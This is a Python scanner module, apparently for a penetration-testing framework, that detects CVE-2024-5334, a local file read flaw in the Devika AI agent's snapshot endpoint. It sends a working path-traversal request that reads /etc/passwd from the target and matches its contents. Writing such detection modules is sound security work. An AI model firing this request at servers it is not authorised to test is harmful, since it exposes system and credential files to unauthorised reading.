#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A local file read vulnerability exists in the stitionai/devika repository, affecting the latest version."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Devika - Local File Inclusion Detection',
        'description': "A local file read vulnerability exists in the stitionai/devika repository, affecting the latest version. The vulnerability is due to improper handling of the 'snapshot_path' parameter in the '/api/get-browser-snapshot' endpoint. An attacker can exploit this vulnerability by crafting a request with a malicious 'snapshot_path' parameter, leading to arbitrary file read from the system. This issue impacts the security of the application by allowing unauthorized access to sensitive files on the server.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'devika-ai', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.com/bounties/7eec128b-1bf5-4922-a95c-551ad3695cf6',
            'https://github.com/stitionai/devika/commit/6acce21fb08c3d1123ef05df6a33912bf0ee77c2',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-5334',
        ],
        'cve': 'CVE-2024-5334',
    }

    def run(self):
        path = '/api/get-browser-snapshot?snapshot_path=/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('attachment; filename=passwd', 'application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Devika - Local File Inclusion detected', path=path)
            return True
        return False

